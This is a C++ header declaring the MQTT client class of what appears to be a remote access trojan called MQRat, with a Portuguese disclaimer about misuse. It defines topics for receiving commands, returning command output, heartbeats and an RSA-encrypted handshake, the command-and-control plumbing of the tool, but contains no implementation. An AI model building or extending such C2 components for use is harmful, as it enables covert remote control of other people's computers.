/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#ifndef MQTT_CLIENT_HPP
#define MQTT_CLIENT_HPP

#include <cstdint>
#include <string>
#include <vector>
#include "crypto.hpp"
#include "key_manager.hpp"
#include "paho/include/MQTTClient.h"

#define CLIENT_ID_LENGTH    32

using namespace std;

/**
 * @brief MQTT Client class
 */
class MqttClient {

public:
	/**
	 * @brief Construct a new Mqtt Client object
	 * 
	 */
	MqttClient();
	
	/**
	 * @brief Destroy the Mqtt Client object
	 * 
	 */
	~MqttClient();

	/**
	 * @brief Construct a new Mqtt Client object
	 * 
	 * @param qos_level Quality of service
	 * @param broker_hostname Broker hostname
	 */
	explicit MqttClient(unsigned qos_level, string broker_hostname);
	
	/**
	 * @brief Construct a new Mqtt Client object
	 * 
	 * @param qos_level QoS level
	 * @param broker_hostname Broker hostname
	 * @param cipher Cipher used to encrypt payloads
	 */
	explicit MqttClient(unsigned qos_level, string broker_hostname, Crypto::RSACipher *cipher, string client_id);


	/**
	 * @brief Set the up mqtt client object
	 * 
	 * @return true on success
	 * @return false on error
	 */
	bool Setup();
	
	/**
	 * @brief Notify server about something wrong (encrypted)
	 * 
	 * @param cipher Handle to RSACipher
	 */
	void SendErrorEncrypted(Crypto::RSACipher *cipher);

	/**
	 * @brief Notify server about something wrong
	 * 
	 */
	void SendError();

	/**
	 * @brief Publishes a encrypted message into a predetermined topic
	 * 
	 * @param data message
	 * @param topic topic name
	 */
	void Publish(string data, string topic);

	/**
	 * @brief Publishes a message into a predetermined topic
	 * 
	 * @param data Message to be published
	 * @param topic Topic name
	 */
	void Publish(vector<string> data, string topic);

	/**
	 * @brief Publishes a message into a predetermined topic
	 * 
	 * @param data message
	 * @param topic topic name
	 * @param QoS Quality of service
	 * @param retained Retained flag
	 */
	void Publish(string data, string topic, unsigned QoS, bool retained);

	/**
	 * @brief Publishes a encrypted message into a predetermined topic
	 * 
	 * @param data payload
	 * @param topic topic name
	 */
	void PublishEncrypted(string data, string topic);

	/**
	 * @brief Publishes a encrypted message into a predetermined topic
	 * 
	 * @param data Data
	 * @param topic Topic name
	 */
	void PublishEncrypted(vector<string> data, string topic);

	/**
	 * @brief Subscribe to a specific topic
	 * 
	 * @param topic Topic name
	 */
	void Subscribe(std::string topic);

	/**
	 * @brief Subscribe to multiple topics
	 * 
	 * @param topics 
	 * @param qos 
	 */
	void Subscribe(char* const* tops, int *qos, int len);

	/**
	 * @brief Subscribe to internal topic
	 * 
	 */
	void Subscribe();

	/**
	 * @brief Get the Client object
	 * 
	 * @return MQTTClient a handle to MQTT client
	 */
	void *GetClient();

	/**
	 * @brief Called when mqtt client losts the connection
	 * 
	 * @param context 
	 * @param cause 
	 */
	void OnConnectionLost(void *context, char *cause);

	/**
	 * @brief Called when a new message is received
	 * 
	 * @param context 
	 * @param topic 
	 * @param topic_len 
	 * @param message 
	 * @return int 
	 */
	int OnMessageReceived(void *context, char *topic, int topic_len, MQTTClient_message *message);

	/**
	 * @brief Called when the message is delivered to broker
	 * 
	 * @param context 
	 * @param token 
	 */
	void OnDelivered(void* context, int delivery_token);

	/**
	 * @brief connects to MQTT broker
	 *
	 */
	void Connect();

	/**
	 * @brief Loop forever
	 * 
	 */
	void Loop();

	/**
	 * @brief Sets the topic name used to send command outputs
	 * 
	 * @param new_topic 
	 */
	void setSendTopic(string new_topic);

	/**
	 * @brief Gets the name of topic used to send command outputs
	 * 
	 * @return string topic name
	 */
	string getSendTopic();

	/**
	 * @brief Gets the name of topic used to receive commands
	 * 
	 * @return string Topic name
	 */
	string getRecvTopic();

	/**
	 * @brief Sets the name of topic used to receive commands
	 * 
	 * @param new_topic Topic name
	 */
	void setRecvTopic(string new_topic);

	/**
	 * @brief Set the Heartbeat Topic object
	 * 
	 * @param new_topic 
	 */
	void setHeartbeatTopic(string new_topic);

	/**
	 * @brief Get the Heartbeat Topic object
	 * 
	 * @return string 
	 */
	string getHeartbeatTopic();

	/**
	 * @brief Set the Handshake Topic object
	 * 
	 * @param topic 
	 */
	void setHandshakeTopic(string topic);

	/**
	 * @brief Get the Cipher object
	 * 
	 * @return Crypto::RSACipher* 
	 */
	Crypto::RSACipher *getCipher();

	/**
	 * @brief Get the Key Manager object
	 * 
	 * @return KeyManager* 
	 */
	KeyManager *GetKeyManager();

private:
	/**
	 * @brief Configure MQTT client options
	 * 
	 * @param options client options
	 */
	void ConfigureOptions(void *options);
	
	/**
	 * @brief Internal method to let server know that's a new client ready
	 * 
	 */
	void SendHeartbeat();

private:
	unsigned qos;
	void *client;
	string broker_host;
	unsigned reconnect_timeout;
	const unsigned yield_delay_ms = 5000U;
	void *dispatcher;
	string send_topic;
	string recv_topic;
	string heartbeat_topic;
	string handshake_topic;
	string client_id;
	const string heartbeat_payload = "/hb";
	Crypto::RSACipher *cipher;
	KeyManager *manager;
};

#endif
